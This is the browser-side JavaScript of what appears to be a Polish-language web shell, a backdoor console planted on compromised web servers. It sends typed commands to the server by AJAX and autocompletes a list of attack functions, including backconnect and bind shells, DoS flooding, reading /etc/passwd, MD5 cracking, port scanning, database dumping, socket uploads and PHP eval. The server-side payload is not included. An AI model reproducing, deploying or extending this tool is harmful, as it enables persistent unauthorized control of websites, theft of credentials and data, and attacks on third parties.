<script>window.onload=function()
{var oConsole=document.getElementById('console');var iHeight=innerHeight-320;var sHeight=((iHeight<100)?100:iHeight)+'px';oConsole.style.minHeight=sHeight;oConsole.style.height=sHeight;}
var aExclude=new Array
('edit','upload','down','download','get','logout','bind','mysqldump','mysqldumper','mysqlbackup','passwordrecovery','pr','dos','flood','backconnect','bc','irc','proxy','emailvalidator');var aCommands=new Array
('help','modules','edit','upload','system','exec','info','mysql','cd','bind','pwd','remove','remote','rm','delete','del','pack','unpack','exit','mysqldump','mysqldumper','mysqlbackup','ftpdownload','ftpdown','ftpget','mv','move','passwordrecovery','pr','logout','ftpupload','ftpup','ftpput','eval','php','dos','flood','g4m3','hexdump','hd','cat','backconnect','bc','socketupload','socketup','socketput','cp','copy','echo','chmod','mail','email','sendmail','mkdir','download','down','get','bcat','b64','etcpasswd','revip','socketdownload','socketdown','socketget','md5crack','irc','ping','ls','proxy','phpinfo','destroy','removeshell','emailvalidator','portscan','portscanner','id','whoami','speedtest','touch','autoload','version');aCommands.sort();var oBody=document.getElementsByTagName('body')[0];if(navigator.appName=='Microsoft Internet Explorer')
{oBody.innerHTML='<h1 style="text-align: center; margin-top: 60px">Twoja przeglądarka jest do dupy, wymień ją na coś lepszego: Opera, Chrome, Firefox</h1>';}
var oStatus=document.createElement('div');oStatus.setAttribute('id','status');oStatus.innerHTML='&nbsp;';oStatus.style.display='none';oBody.appendChild(oStatus);var oForm=document.getElementsByTagName('form')[0];oForm.setAttribute('onsubmit','return submitForm();');var oCmd=document.getElementById('cmd');var oPrompt=document.createElement('div');oPrompt.setAttribute('id','prompt');oPrompt.setAttribute('style','text-align: left; word-wrap: break-word; padding-left: 25px');oPrompt.innerHTML='<strong>Dostępne polecenia:</strong> <em>Brak</em>';oForm.appendChild(document.createElement('br'));oForm.appendChild(document.createElement('br'));oForm.appendChild(oPrompt);autoPrompt(oCmd.value.substring(1));event(oCmd,'keyup',function(oKey)
{if(oKey.which==9)
{return;}
if((oCmd.value.length>0)&&(oCmd.value.substring(0,1)==':'))
{autoPrompt(oCmd.value.substring(1));}
else
{oPrompt.innerHTML='<strong>Dostępne polecenia:</strong> <em>Brak</em>';}});function isExclude(sCmd)
{for(i=0;i<aExclude.length;++i)
{if(sCmd.substring(1,aExclude[i].length+1)==aExclude[i])
{return true;}}
return false;}
function submitForm()
{var oCmd=document.getElementById('cmd');if((document.getElementById('cmd-send').getAttribute('value')=='Execute')&&!isExclude(oCmd.value))
{oStatus.style.display='block';var oAjax=new XMLHttpRequest();oAjax.open('POST','',true);oAjax.setRequestHeader('X-Requested-With','XMLHttpRequest');oAjax.setRequestHeader('Content-Type','application/x-www-form-urlencoded');oAjax.onreadystatechange=function()
{if(oAjax.readyState==4)
{document.getElementById('console').innerHTML=oAjax.responseText;oStatus.style.display='none';}}
var sCmd=escape(oCmd.value);oAjax.send('cmd='+sCmd.replace(new RegExp('~~+','g'),'%2B'));return false;}
return true;}
function event(oElement,sAction,fFunction)
{if(oElement.attachEvent)
{oElement.attachEvent(sAction,fFunction);}
else if(oElement.addEventListener)
{oElement.addEventListener(sAction,fFunction);}}
function changeCommand(sCmd)
{oCmd.value=':'+sCmd+' ';autoPrompt(sCmd);}
function autoPrompt(sCommand)
{var sOutput='';aParametrs=sCommand.split(' ');sCommand=aParametrs[0].trim();bEnd=!(aParametrs[1]==undefined);if(sCommand!=='')
{for(i in aCommands)
{if(aCommands[i].substring(0,sCommand.length)==sCommand)
{if(bEnd&&(aCommands[i]==sCommand))
{sOutput='<span class="red">';sOutput+=aCommands[i];sOutput+='</span>,&nbsp;';break;}
else
{sOutput+="<span onclick=\"changeCommand('"+aCommands[i]+"');\">";sOutput+='<span class="red">';sOutput+=aCommands[i].substring(0,sCommand.length);sOutput+='</span>';sOutput+=aCommands[i].substring(sCommand.length);sOutput+='</span>,&nbsp;';}}}}
else
{for(i in aCommands)
{sOutput+="<span onclick=\"changeCommand('"+aCommands[i]+"');\" class=\"red\">";sOutput+=aCommands[i];sOutput+='</span>,&nbsp;';}}
if(sOutput=='')
{sOutput='<em>Brak</em>';}
else
{sOutput=sOutput.substring(0,sOutput.length-7);}
oPrompt.innerHTML='<strong>Dostępne polecenia:</strong> '+sOutput;var oSpan=oPrompt.getElementsByTagName('span');for(i=0;i<oSpan.length;++i)
{sName=oSpan[i].getAttribute('onclick');if(sName!=null)
{oSpan[i].style.cursor='pointer';}}}</script>